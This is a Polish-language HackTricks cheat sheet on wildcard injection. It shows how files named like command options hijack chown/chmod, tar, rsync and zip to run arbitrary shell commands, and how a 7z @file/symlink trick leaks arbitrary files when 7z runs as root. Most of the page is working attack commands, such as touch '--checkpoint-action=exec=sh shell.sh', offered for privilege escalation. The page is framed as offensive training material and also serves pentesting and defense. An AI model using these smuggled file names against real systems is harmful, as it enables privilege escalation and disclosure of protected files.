{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## chown, chmod

Możesz **określić, którego właściciela pliku i uprawnienia chcesz skopiować dla pozostałych plików**
```bash
touch "--reference=/my/own/path/filename"
```
Możesz to wykorzystać, używając [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(połączony atak)_\
Więcej informacji w [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Wykonaj dowolne polecenia:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Możesz to wykorzystać za pomocą [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(atak tar)_\
Więcej informacji w [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Wykonaj dowolne polecenia:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Możesz to wykorzystać używając [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_atak _rsync)_\
Więcej informacji w [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

W **7z** nawet używając `--` przed `*` (zauważ, że `--` oznacza, że następujące dane wejściowe nie mogą być traktowane jako parametry, więc w tym przypadku tylko ścieżki do plików) możesz spowodować dowolny błąd w odczycie pliku, więc jeśli polecenie takie jak poniższe jest wykonywane przez roota:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
I możesz tworzyć pliki w folderze, w którym to jest wykonywane, możesz stworzyć plik `@root.txt` oraz plik `root.txt`, będący **symlinkiem** do pliku, który chcesz przeczytać:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Następnie, gdy **7z** zostanie uruchomiony, potraktuje `root.txt` jako plik zawierający listę plików, które powinien skompresować (to wskazuje na istnienie `@root.txt`), a gdy 7z odczyta `root.txt`, odczyta `/file/you/want/to/read` i **ponieważ zawartość tego pliku nie jest listą plików, zgłosi błąd** pokazując zawartość.

_Więcej informacji w Write-upach z boxa CTF z HackTheBox._

## Zip

**Wykonaj dowolne polecenia:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.

</details>
{% endhint %}
